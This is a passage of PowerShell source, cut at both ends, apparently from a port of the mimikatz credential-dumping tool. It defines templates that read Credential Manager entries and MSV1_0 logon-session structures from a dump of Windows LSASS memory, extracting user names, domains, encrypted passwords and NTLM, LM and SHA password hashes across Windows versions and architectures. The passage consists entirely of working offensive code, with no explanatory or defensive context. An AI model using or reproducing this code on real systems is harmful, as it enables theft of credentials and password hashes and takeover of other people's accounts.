		$StructToWrite["Server2"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["Server2"]

		return
	}

	function KIWI_CREDMAN_List_Entry($Handle, $Pages, $AddrStruct, $StructToWrite)
	{
		$StructToWrite["FBLink_Func"] = (Get-Item "function:KIWI_CREDMAN_List_Entry").ScriptBlock

		$Buff, $OffAddr, $BaseAddr = ReadMemory $Handle $Pages ($AddrStruct - 56)
		$Buff = $Buff[$OffAddr..($OffAddr + $Buff.Length - 1)]
		$BaseAddr += $OffAddr
		$Offset = 0

		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["cbEncPassword"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["encPassword"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk0"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk1"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk2"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk3"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["UserName"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["cbUserName"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Flink"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Blink"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk4"] = @{}
		$StructToWrite["Unk4"]["Flink"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk4"]["Blink"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Type"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["Type"]
		$StructToWrite["Unk5"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Server1"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["Server1"]
		$StructToWrite["Unk6"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk7"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk8"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk9"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk10"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["User"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["User"]
		$StructToWrite["Unk11"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Server2"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["Server2"]

		return
	}

	function KIWI_CREDMAN_LIST_STARTER($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$StructToWrite["Unk0"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Start_Func"] = (Get-Item "function:KIWI_CREDMAN_List_Entry").ScriptBlock
		$StructToWrite["Start"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"

		return
	}

	function KIWI_CREDMAN_SET_List_Entry($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$StructToWrite["FBLink_Func"] = (Get-Item "function:KIWI_CREDMAN_SET_List_Entry").ScriptBlock
		$StructToWrite["Flink"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Blink"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk0"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["List12_Func"] = (Get-Item "function:KIWI_CREDMAN_LIST_STARTER").ScriptBlock
		$StructToWrite["List1"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["List2"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"

		return
	}

	If ($Dump["SysInfo"]["ProcessorArchitecture"] -eq $Global:PROCESSOR_ARCHITECTURE_INTEL)
	{
		# Processor x86
		If ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_VISTA)
		{
			Write-Host ("[-] Unsupported build number = {0})" -f ($Dump["SysInfo"]["BuildNumber"]))
			return $Null
		}
		ElseIf (($Global:MINBUILD_WIN_VISTA -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_7))
		{
			$CredmanTemplate["Signature"] = $Null
			$CredmanTemplate["First_Entry_Offset"] = $Null
			$CredmanTemplate["List_Entry"] = (Get-Item "function:KIWI_CREDMAN_List_Entry_60_X86").ScriptBlock
		}
		Else
		{
			$CredmanTemplate["Signature"] = $Null
			$CredmanTemplate["First_Entry_Offset"] = $Null
			$CredmanTemplate["List_Entry"] = (Get-Item "function:KIWI_CREDMAN_List_Entry_X86").ScriptBlock
		}
	}
	ElseIf ($Dump["SysInfo"]["ProcessorArchitecture"] -eq $Global:PROCESSOR_ARCHITECTURE_AMD64)
	{
		# Processor x64
		If ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_VISTA)
		{
			Write-Host ("[-] Unsupported build number = {0})" -f ($Dump["SysInfo"]["BuildNumber"]))
			return $Null
		}
		ElseIf (($Global:MINBUILD_WIN_VISTA -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_7))
		{
			$CredmanTemplate["Signature"] = $Null
			$CredmanTemplate["First_Entry_Offset"] = $Null
			$CredmanTemplate["List_Entry"] = (Get-Item "function:KIWI_CREDMAN_List_Entry_60").ScriptBlock
		}
		Else
		{
			$CredmanTemplate["Signature"] = $Null
			$CredmanTemplate["First_Entry_Offset"] = $Null
			$CredmanTemplate["List_Entry"] = (Get-Item "function:KIWI_CREDMAN_List_Entry").ScriptBlock
		}
	}

	<### MSV Templates ###>

	$MSVTemplate = @{}
	$MSVTemplate["Signature"] = $Null
	$MSVTemplate["First_Entry_Offset"] = $Null
	$MSVTemplate["Offset2"] = $Null
	$MSVTemplate["List_Entry"] = $Null
	$MSVTemplate["Encrypted_Credentials_List_Struct"] = $Null
	$MSVTemplate["Encrypted_Credential_Struct"] = $Null
	$MSVTemplate["Decrypted_Credential_Struct"] = $Null

	$MSV1_0_PRIMARY_CREDENTIAL_STRANGE_DEC_SIZE = 0x60
	function MSV1_0_PRIMARY_CREDENTIAL_STRANGE_DEC($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$StructToWrite["Unk1"] = GetType $Buff $BaseAddr ([ref]$Offset) "USHORT"
		$StructToWrite["Unk2"] = GetType $Buff $BaseAddr ([ref]$Offset) "USHORT"
		$StructToWrite["Unk_Tag"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong" # 0xcccccc
		$StructToWrite["Unk_Remaining_Size"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong" # 0x50
		$Null = ReadBuff $Buff 40 ([ref]$Offset)
		$StructToWrite["LengthOfNtOwfPassword"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["NtOwfPassword"] = ReadBuff $Buff 16 ([ref]$Offset)
		$StructToWrite["LengthOfShaOwfPassword"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["ShaOwPassword"] = ReadBuff $Buff 20 ([ref]$Offset)
		$StructToWrite["LogonDomainName"] = $Null
		$StructToWrite["UserName"] = $Null
		$StructToWrite["LmOwfPassword"] = $Null
		$StructToWrite["isNtOwfPassword"] = $Null
		$StructToWrite["isLmOwfPassword"] = $Null
		$StructToWrite["isShaOwPassword"] = $Null

		return
	}

	function MSV1_0_PRIMARY_CREDENTIAL_DEC($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$StructToWrite["LogonDomainName"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["LogonDomainName"]
		$StructToWrite["UserName"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["UserName"]
		$StructToWrite["NtOwfPassword"] = ReadBuff $Buff 16 ([ref]$Offset)
		$StructToWrite["LmOwfPassword"] = ReadBuff $Buff 16 ([ref]$Offset)
		$StructToWrite["ShaOwPassword"] = ReadBuff $Buff 20 ([ref]$Offset)
		$StructToWrite["isNtOwfPassword"] = GetType $Buff $BaseAddr ([ref]$Offset) "Boolean"
		$StructToWrite["isLmOwfPassword"] = GetType $Buff $BaseAddr ([ref]$Offset) "Boolean"
		$StructToWrite["isShaOwPassword"] = GetType $Buff $BaseAddr ([ref]$Offset) "Boolean"

		return
	}

	function MSV1_0_PRIMARY_CREDENTIAL_10_OLD_DEC($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$StructToWrite["LogonDomainName"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["LogonDomainName"]
		$StructToWrite["UserName"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["UserName"]
		$StructToWrite["isIso"] = GetType $Buff $BaseAddr ([ref]$Offset) "Boolean"
		$StructToWrite["isNtOwfPassword"] = GetType $Buff $BaseAddr ([ref]$Offset) "Boolean"
		$StructToWrite["isLmOwfPassword"] = GetType $Buff $BaseAddr ([ref]$Offset) "Boolean"
		$StructToWrite["isShaOwPassword"] = GetType $Buff $BaseAddr ([ref]$Offset) "Boolean"
		$StructToWrite["Align0"] = GetType $Buff $BaseAddr ([ref]$Offset) "Boolean"
		$StructToWrite["Align1"] = GetType $Buff $BaseAddr ([ref]$Offset) "Boolean"
		$StructToWrite["NtOwfPassword"] = ReadBuff $Buff 16 ([ref]$Offset)
		$StructToWrite["LmOwfPassword"] = ReadBuff $Buff 16 ([ref]$Offset)
		$StructToWrite["ShaOwPassword"] = ReadBuff $Buff 20 ([ref]$Offset)

		return
	}

	function MSV1_0_PRIMARY_CREDENTIAL_10_DEC($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$StructToWrite["LogonDomainName"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["LogonDomainName"]
		$StructToWrite["UserName"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["UserName"]
		$StructToWrite["isIso"] = GetType $Buff $BaseAddr ([ref]$Offset) "Boolean"
		$StructToWrite["isNtOwfPassword"] = GetType $Buff $BaseAddr ([ref]$Offset) "Boolean"
		$StructToWrite["isLmOwfPassword"] = GetType $Buff $BaseAddr ([ref]$Offset) "Boolean"
		$StructToWrite["isShaOwPassword"] = GetType $Buff $BaseAddr ([ref]$Offset) "Boolean"
		$StructToWrite["Align0"] = GetType $Buff $BaseAddr ([ref]$Offset) "Boolean"
		$StructToWrite["Align1"] = GetType $Buff $BaseAddr ([ref]$Offset) "Boolean"
		$StructToWrite["Align2"] = GetType $Buff $BaseAddr ([ref]$Offset) "Boolean"
		$StructToWrite["Align3"] = GetType $Buff $BaseAddr ([ref]$Offset) "Boolean"
		$StructToWrite["NtOwfPassword"] = ReadBuff $Buff 16 ([ref]$Offset)
		$StructToWrite["LmOwfPassword"] = ReadBuff $Buff 16 ([ref]$Offset)
		$StructToWrite["ShaOwPassword"] = ReadBuff $Buff 20 ([ref]$Offset)

		return
	}

	function MSV1_0_PRIMARY_CREDENTIAL_10_1607_DEC($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$StructToWrite["LogonDomainName"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["LogonDomainName"]
		$StructToWrite["UserName"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["UserName"]
		$StructToWrite["pNtlmCredIsoInProc"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["isIso"] = GetType $Buff $BaseAddr ([ref]$Offset) "Boolean"
		$StructToWrite["isNtOwfPassword"] = GetType $Buff $BaseAddr ([ref]$Offset) "Boolean"
		$StructToWrite["isLmOwfPassword"] = GetType $Buff $BaseAddr ([ref]$Offset) "Boolean"
		$StructToWrite["isShaOwPassword"] = GetType $Buff $BaseAddr ([ref]$Offset) "Boolean"
		$StructToWrite["isDPAPIProtected"] = GetType $Buff $BaseAddr ([ref]$Offset) "Boolean"
		$StructToWrite["Align0"] = GetType $Buff $BaseAddr ([ref]$Offset) "Boolean"
		$StructToWrite["Align1"] = GetType $Buff $BaseAddr ([ref]$Offset) "Boolean"
		$StructToWrite["Align2"] = GetType $Buff $BaseAddr ([ref]$Offset) "Boolean"
		$StructToWrite["UnkD"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["isoSize"] = GetType $Buff $BaseAddr ([ref]$Offset) "USHORT"
		$StructToWrite["DPAPIProtected"] = ReadBuff $Buff 16 ([ref]$Offset)
		$StructToWrite["Align3"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["NtOwfPassword"] = ReadBuff $Buff 16 ([ref]$Offset)
		$StructToWrite["LmOwfPassword"] = ReadBuff $Buff 16 ([ref]$Offset)
		$StructToWrite["ShaOwPassword"] = ReadBuff $Buff 20 ([ref]$Offset)

		return
	}

	function KIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$StructToWrite["Flink"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Primary"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "ANSI_String" $StructToWrite["Primary"]
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Encrypted_Credentials"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["Encrypted_Credentials"]

		return
	}

	function KIWI_MSV1_0_CREDENTIAL_LIST($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$StructToWrite["Flink"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["AuthenticationPackageId"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["PrimaryCredentials_Ptr_Loc"] = $Offset
		$StructToWrite["PrimaryCredentials_Ptr_Func"] = (Get-Item "function:KIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC").ScriptBlock
		$StructToWrite["PrimaryCredentials_Ptr"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"

		return
	}

	$MSVTemplate["Encrypted_Credentials_List_Struct"] = (Get-Item "function:KIWI_MSV1_0_CREDENTIAL_LIST").ScriptBlock
	$MSVTemplate["Encrypted_Credential_Struct"] = (Get-Item "function:KIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC").ScriptBlock

	function KIWI_MSV1_0_LIST_60($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$StructToWrite["Flink"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Blink"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Unk0"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk1"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Unk2"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk3"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk4"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk5"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["hSemaphore6"] = GetType $Buff $BaseAddr ([ref]$Offset) "Handle"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Unk7"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["hSemaphore8"] = GetType $Buff $BaseAddr ([ref]$Offset) "Handle"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Unk9"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Unk10"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk11"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk12"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Unk13"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["LocallyUniqueIdentifier"] = [System.BitConverter]::ToUint64((ReadBuff $Buff 8 ([ref]$Offset)), 0)
		$StructToWrite["SecondaryLocallyUniqueIdentifier"] = [System.BitConverter]::ToUint64((ReadBuff $Buff 8 ([ref]$Offset)), 0)
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["UserName"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["UserName"]
		$StructToWrite["Domain"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["Domain"]
		$StructToWrite["Unk14"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk15"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["pSid"] = GetType $Buff $BaseAddr ([ref]$Offset) "PSID"
		$StructToWrite["LogonType"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Session"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset 8
		$StructToWrite["LogonTime"] = [System.BitConverter]::ToUint64((ReadBuff $Buff 8 ([ref]$Offset)), 0)
		$StructToWrite["LogonServer"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["LogonServer"]
		$StructToWrite["Credentials_List_Ptr_Offset"] = $Offset
		$StructToWrite["Credentials_List_Ptr_Func"] = (Get-Item "function:KIWI_MSV1_0_CREDENTIAL_LIST").ScriptBlock
		$StructToWrite["Credentials_List_Ptr"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk19"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Unk20"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk21"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk22"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk23"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["CredentialManager"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"

		return
	}

	function KIWI_MSV1_0_LIST_61($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$StructToWrite["Flink"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Blink"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk0"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk1"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Unk2"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk3"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk4"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk5"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["hSemaphore6"] = GetType $Buff $BaseAddr ([ref]$Offset) "Handle"
		$StructToWrite["Unk7"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["hSemaphore8"] = GetType $Buff $BaseAddr ([ref]$Offset) "Handle"
		$StructToWrite["Unk9"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk10"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk11"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk12"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk13"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["LocallyUniqueIdentifier"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LUID" $StructToWrite["LocallyUniqueIdentifier"]
		$StructToWrite["SecondaryLocallyUniqueIdentifier"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LUID" $StructToWrite["SecondaryLocallyUniqueIdentifier"]
		$StructToWrite["UserName"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["UserName"]
		$StructToWrite["Domain"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["Domain"]
		$StructToWrite["Unk14"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk15"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["pSid"] = GetType $Buff $BaseAddr ([ref]$Offset) "PSID"
		$StructToWrite["LogonType"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Session"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset 8
		$StructToWrite["LogonTime"] = [System.BitConverter]::ToUint64((ReadBuff $Buff 8 ([ref]$Offset)), 0)
		$StructToWrite["LogonServer"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["LogonServer"]
		$StructToWrite["Credentials_List_Ptr_Offset"] = $Offset
		$StructToWrite["Credentials_List_Ptr_Func"] = (Get-Item "function:KIWI_MSV1_0_CREDENTIAL_LIST").ScriptBlock
		$StructToWrite["Credentials_List_Ptr"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk19"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk20"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk21"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk22"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["CredentialManager"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"

		return
	}

	function KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$StructToWrite["Flink"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Blink"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk0"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk1"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Unk2"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk3"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk4"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk5"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["hSemaphore6"] = GetType $Buff $BaseAddr ([ref]$Offset) "Handle"
		$StructToWrite["Unk7"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["hSemaphore8"] = GetType $Buff $BaseAddr ([ref]$Offset) "Handle"
		$StructToWrite["Unk9"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk10"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk11"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk12"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk13"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["LocallyUniqueIdentifier"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LUID" $StructToWrite["LocallyUniqueIdentifier"]
		$StructToWrite["SecondaryLocallyUniqueIdentifier"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LUID" $StructToWrite["SecondaryLocallyUniqueIdentifier"]
		$StructToWrite["Waza"] = ReadBuff $Buff 12 ([ref]$Offset)
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["UserName"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["UserName"]
		$StructToWrite["Domain"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["Domain"]
		$StructToWrite["Unk14"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk15"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["pSid"] = GetType $Buff $BaseAddr ([ref]$Offset) "PSID"
		$StructToWrite["LogonType"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Session"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset 8
		$StructToWrite["LogonTime"] = [System.BitConverter]::ToUint64((ReadBuff $Buff 8 ([ref]$Offset)), 0)
		$StructToWrite["LogonServer"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["LogonServer"]
		$StructToWrite["Credentials_List_Ptr_Offset"] = $Offset
		$StructToWrite["Credentials_List_Ptr_Func"] = (Get-Item "function:KIWI_MSV1_0_CREDENTIAL_LIST").ScriptBlock
		$StructToWrite["Credentials_List_Ptr"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk19"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk20"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk21"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk22"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["CredentialManager"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"

		return
	}

	function KIWI_MSV1_0_LIST_62($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$StructToWrite["Flink"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Blink"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk0"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk1"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Unk2"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk3"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk4"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk5"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["hSemaphore6"] = GetType $Buff $BaseAddr ([ref]$Offset) "Handle"
		$StructToWrite["Unk7"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["hSemaphore8"] = GetType $Buff $BaseAddr ([ref]$Offset) "Handle"
		$StructToWrite["Unk9"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk10"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk11"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk12"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk13"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["LocallyUniqueIdentifier"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LUID" $StructToWrite["LocallyUniqueIdentifier"]
